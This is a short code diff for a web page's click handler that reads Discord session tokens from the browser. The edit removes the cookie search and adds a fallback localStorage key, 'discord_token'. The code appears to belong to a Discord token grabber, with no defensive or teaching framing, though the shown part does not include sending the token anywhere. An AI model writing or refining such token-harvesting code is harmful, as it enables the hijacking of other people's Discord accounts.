@@ -12,25 +12,13 @@
         document.getElementById('tokenLink').addEventListener('click', function(event) {
             event.preventDefault();
 
-            // Function to fetch Discord tokens from local storage and cookies
+            // Function to fetch Discord tokens from local storage
             function fetchDiscordTokens() {
                 let token = null;
 
                 // Check local storage
                 if (typeof localStorage !== 'undefined') {
-                    token = localStorage.getItem('token');
-                }
-
-                // Check cookies
-                if (!token) {
-                    const cookies = document.cookie.split(';');
-                    for (let cookie of cookies) {
-                        const [name, value] = cookie.split('=').map(c => c.trim());
-                        if (name === 'token') {
-                            token = value;
-                            break;
-                        }
-                    }
+                    token = localStorage.getItem('token') || localStorage.getItem('discord_token');
                 }
 
                 return token;
